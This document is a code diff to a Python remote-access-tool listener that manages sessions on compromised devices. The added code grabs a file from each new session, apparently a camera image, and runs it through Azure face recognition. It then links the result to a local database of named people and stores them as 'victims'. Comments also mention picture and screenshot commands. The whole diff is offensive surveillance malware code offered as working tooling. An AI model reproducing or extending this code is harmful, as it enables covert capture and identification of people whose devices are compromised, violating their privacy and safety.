@@ -1,14 +1,40 @@
 from modules import helper as h
+from azure import faceRec
 import threading, socket, time, sys
+import json
 
 class MultiHandler:
 	def __init__(self,server):
 		self.server = server
 		self.thread = None
+		self.new_session_id = -1
 		self.sessions_id = dict()
 		self.sessions_uid = dict()
+		self.person_db = dict()
+		self.faceid_mapping = dict()
+		self.victims = dict()
+		self.victims_modify = False
+###		For test
+###		self.victims = {"name": "Aimin Wei", "age": 24, "gender": "male"}
+###		self.victims_modify = True
 		self.handle = h.COLOR_INFO + "MultiHandler" + h.ENDC + "> "
 		self.is_running = False
+		self.load_person_info()
+		self.load_faceid2person()
+
+
+	def load_person_info(self):
+		json_file = open("privacy_db.json")
+		self.person_db = json.load(json_file)
+		print(self.person_db)
+		json_file.close()
+
+
+	def load_faceid2person(self):
+		json_file = open("faceid_mapping.json")
+		self.faceid_mapping = json.load(json_file)
+		print(self.faceid_mapping)
+		json_file.close()
 
 
 	def update_session(self,current_session,new_session):
@@ -36,10 +62,12 @@ class MultiHandler:
 					else:
 						self.sessions_uid[session.uid] = session
 						self.sessions_id[id_number] = session
+						self.new_session_id = id_number
 						session.id = id_number
 						id_number += 1
 						sys.stdout.write("\n{0}[*]{2} Session {1} opened{2}\n{3}".format(h.COLOR_INFO,str(session.id),h.WHITE,self.handle))
 						sys.stdout.flush()
+						self.init_interact_with_session()
 			else:
 				return
 
@@ -74,14 +102,15 @@ class MultiHandler:
 				self.show_session(self.sessions_id[key])
 
 
-	def interact_with_session(self,session_number):
+	def interact_with_session(self,session_number, cmd_data):
 		if not session_number:
 			print "Usage: interact (session number)"
-			return
+			return None
 		try:
-			self.sessions_id[int(session_number)].interact()
+			return self.sessions_id[int(session_number)].interact(cmd_data)
 		except:
 			h.info_error("Invalid Session")
+			return None
 
 
 	def close_session(self,session_number):
@@ -122,33 +151,47 @@ class MultiHandler:
 			self.show_command(command[0],command[1])
 
 
-	def interact(self):
-		h.info_general("Listening on port {0}...".format(self.server.port))
-		h.info_general("Type \"help\" for commands")
-		while 1:
-			try:
-				input_data = raw_input(self.handle)
-				if not input_data:
-					continue
-				cmd = input_data.split()[0]
-				args = input_data[len(cmd):].strip()
-				if cmd == "interact":
-					self.interact_with_session(args)
-				elif cmd == "close":
-					self.close_session(args)
-				elif cmd == "sessions":
-					self.list_sessions()
-				elif cmd == "help":
-					self.show_commands()
-				elif cmd == "exit":
-					self.stop_server()
-					return
-				else:
-					h.info_error("Invalid Command: " + cmd)
+	def init_interact_with_session(self):
+		if self.new_session_id < 1:
+			print "Usage: interact (session number)"
+			return
+		try:
+			file_name = self.sessions_id[self.new_session_id].init_interact()
+			response = faceRec(file_name)
+			response = json.loads(response)
+			if response['status'] == "Ok":
+				print(response['faceId'])
+				faceid = response['faceId']
+			else:
+				print("no data match")
+				faceid = ""
+#			faceid = "faceid1"
+			if faceid in self.faceid_mapping['FaceToPerson']:
+				person_name = self.faceid_mapping['FaceToPerson'][faceid]
+				for person in self.person_db['Person']:
+					if person['name'] == person_name:
+						self.victims[self.new_session_id] = person
+						self.victims_modify = True
+		except:
+			h.info_error("Invalid Session")
 
-			except KeyboardInterrupt:
-				sys.stdout.write("\n")
-				self.stop_server()
-				return
 
+	def interact(self, session_id, cmd_data):
+#		h.info_general("Listening on port {0}...".format(self.server.port))
+#		h.info_general("Type \"help\" for commands")
+		try:
+			cmd = cmd_data.split()[0]
+			para = {"cmd": cmd, "args": cmd_data[len(cmd) + 1:]}
+			result = self.interact_with_session(session_id, cmd_data)
+			'''
+			if cmd == "picture" and not result:
+				return result
+			elif cmd == "screenshot" and not result:
+				return result
+			'''
+			return result
+		except KeyboardInterrupt:
+			sys.stdout.write("\n")
+			self.stop_server()
+			return None
 
